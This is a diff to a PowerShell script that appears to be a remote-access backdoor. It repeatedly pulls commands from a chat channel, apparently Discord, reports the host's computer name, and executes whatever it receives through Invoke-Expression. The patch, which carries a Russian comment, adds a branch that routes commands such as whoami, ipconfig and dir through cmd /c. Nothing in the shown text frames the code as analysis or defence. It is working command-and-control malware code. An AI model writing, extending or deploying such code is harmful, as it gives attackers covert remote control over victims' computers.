@@ -56,7 +56,6 @@ Function Authenticate{
 PullMsg
 $previouscmd = $response
 sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
-
 while ($true) {
     PullMsg
     if ($response -ne $previouscmd) {
@@ -76,10 +75,11 @@ while ($true) {
                 sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
             }
             else {
-                $Result = try {
-                    iex($response) 2>&1
-                } catch {
-                    $_
+                # Выполнение PowerShell и CMD команд
+                if ($response -match '^(ipconfig|ping|dir|date|whoami|echo)') {
+                    $Result = &cmd /c $response 2>&1
+                } else {
+                    $Result = try { iex($response) 2>&1 } catch { $_ }
                 }
                 if ($null -eq $Result -or $Result -eq "" -or ($Result -is [System.Management.Automation.ErrorRecord])) {
                     $script:previouscmd = $response
@@ -106,3 +106,4 @@ while ($true) {
     }
     Start-Sleep -Seconds 5
 }
+
